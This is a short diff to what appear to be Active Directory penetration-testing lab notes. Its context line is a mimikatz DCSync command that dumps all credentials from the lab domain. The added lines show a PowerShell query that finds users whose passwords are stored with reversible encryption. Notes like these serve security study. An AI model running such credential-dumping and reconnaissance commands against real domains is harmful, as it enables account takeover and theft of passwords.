@@ -151,3 +151,14 @@ mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" "exit"
 
 
 ```
+
+example - finding user with revesible encryption enabled 
+```c
+STORE_WITH_REVERSIBLE_ENCRYPTION = 0x80 (decimal 128)
+```
+```c
+Get-ADUser -Filter * -Properties UserAccountControl | 
+Where-Object {($_.UserAccountControl -band 128)} | 
+Select SamAccountName, UserAccountControl
+
+```
